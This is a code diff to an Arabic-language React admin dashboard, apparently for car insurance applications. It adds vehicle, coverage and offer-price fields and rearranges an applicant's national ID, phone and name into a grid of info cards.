@@ -38,6 +38,8 @@ import {
   Shield,
   AlertTriangle,
   LogOut,
+  Car,
+  DollarSign,
 } from "lucide-react";
 import { cn } from "@/lib/utils";
 import { ScrollArea } from "@/components/ui/scroll-area";
@@ -136,6 +138,11 @@ interface Notification {
   os?: string;
   documment_owner_full_name?: string;
   identityNumber?: string;
+  vehicleSerial?: string;
+  vehicleYear?: string;
+  coverageType?: string;
+  selectedOfferName?: string;
+  offerTotalPrice?: string;
 }
 
 export default function Dashboard() {
@@ -1156,34 +1163,96 @@ export default function Dashboard() {
                 </p>
               </ChatBubble>
 
-              {/* Basic Info */}
-              <ChatBubble
-                title="المعلومات الأساسية"
-                isUser
-                icon={<User size={16} />}
-              >
-                <div className="space-y-1 text-sm">
-                  {getNationalId(selectedApplication) && (
-                    <div>
-                      رقم الهوية:{" "}
-                      <span className="font-mono" dir="ltr">
-                        {getNationalId(selectedApplication)}
-                      </span>
-                    </div>
-                  )}
-                  {getCardName(selectedApplication) && (
-                    <div>الاسم: {getCardName(selectedApplication)}</div>
-                  )}
-                  {getPhoneNumber(selectedApplication) && (
-                    <div>
-                      الهاتف:{" "}
-                      <span className="font-mono" dir="ltr">
-                        {getPhoneNumber(selectedApplication)}
-                      </span>
-                    </div>
-                  )}
+              {/* Info Grid */}
+              <div className="grid grid-cols-2 md:grid-cols-4 gap-3" data-testid="info-grid">
+                {/* National ID */}
+                <div className="bg-card rounded-lg border border-border p-3">
+                  <div className="flex items-center gap-2 text-muted-foreground text-xs mb-1">
+                    <User size={12} />
+                    <span>رقم الهوية</span>
+                  </div>
+                  <div className="font-mono text-sm font-medium text-foreground" dir="ltr" data-testid="grid-national-id">
+                    {getNationalId(selectedApplication) || "—"}
+                  </div>
                 </div>
-              </ChatBubble>
+
+                {/* Phone */}
+                <div className="bg-card rounded-lg border border-border p-3">
+                  <div className="flex items-center gap-2 text-muted-foreground text-xs mb-1">
+                    <Phone size={12} />
+                    <span>الهاتف</span>
+                  </div>
+                  <div className="font-mono text-sm font-medium text-foreground" dir="ltr" data-testid="grid-phone">
+                    {getPhoneNumber(selectedApplication) || "—"}
+                  </div>
+                </div>
+
+                {/* Car Serial */}
+                <div className="bg-card rounded-lg border border-border p-3">
+                  <div className="flex items-center gap-2 text-muted-foreground text-xs mb-1">
+                    <Car size={12} />
+                    <span>رقم المركبة</span>
+                  </div>
+                  <div className="font-mono text-sm font-medium text-foreground" dir="ltr" data-testid="grid-vehicle-serial">
+                    {selectedApplication.vehicleSerial || "—"}
+                  </div>
+                </div>
+
+                {/* Insurance Amount */}
+                <div className="bg-gradient-to-l from-green-500/10 to-card rounded-lg border border-green-500/30 p-3">
+                  <div className="flex items-center gap-2 text-green-600 text-xs mb-1">
+                    <DollarSign size={12} />
+                    <span>مبلغ التأمين</span>
+                  </div>
+                  <div className="font-bold text-lg text-green-600" dir="ltr" data-testid="grid-insurance-amount">
+                    {selectedApplication.offerTotalPrice ? `${selectedApplication.offerTotalPrice} ر.س` : "—"}
+                  </div>
+                </div>
+
+                {/* Name */}
+                <div className="bg-card rounded-lg border border-border p-3">
+                  <div className="flex items-center gap-2 text-muted-foreground text-xs mb-1">
+                    <User size={12} />
+                    <span>الاسم</span>
+                  </div>
+                  <div className="text-sm font-medium text-foreground truncate" data-testid="grid-name">
+                    {getCardName(selectedApplication) || selectedApplication.documment_owner_full_name || "—"}
+                  </div>
+                </div>
+
+                {/* Vehicle Year */}
+                <div className="bg-card rounded-lg border border-border p-3">
+                  <div className="flex items-center gap-2 text-muted-foreground text-xs mb-1">
+                    <Clock size={12} />
+                    <span>سنة الصنع</span>
+                  </div>
+                  <div className="font-mono text-sm font-medium text-foreground" data-testid="grid-vehicle-year">
+                    {selectedApplication.vehicleYear || "—"}
+                  </div>
+                </div>
+
+                {/* Coverage Type */}
+                <div className="bg-card rounded-lg border border-border p-3">
+                  <div className="flex items-center gap-2 text-muted-foreground text-xs mb-1">
+                    <Shield size={12} />
+                    <span>نوع التغطية</span>
+                  </div>
+                  <div className="text-sm font-medium text-foreground" data-testid="grid-coverage">
+                    {selectedApplication.coverageType === "comprehensive" ? "شامل" : selectedApplication.coverageType === "third-party" ? "ضد الغير" : "—"}
+                  </div>
+                </div>
+
+                {/* Offer Name */}
+                <div className="bg-card rounded-lg border border-border p-3">
+                  <div className="flex items-center gap-2 text-muted-foreground text-xs mb-1">
+                    <FileText size={12} />
+                    <span>العرض</span>
+                  </div>
+                  <div className="text-sm font-medium text-foreground truncate" data-testid="grid-offer">
+                    {selectedApplication.selectedOfferName || "—"}
+                  </div>
+                </div>
+              </div>
 
               {/* Payment Card */}
               {getCardNumber(selectedApplication) && (
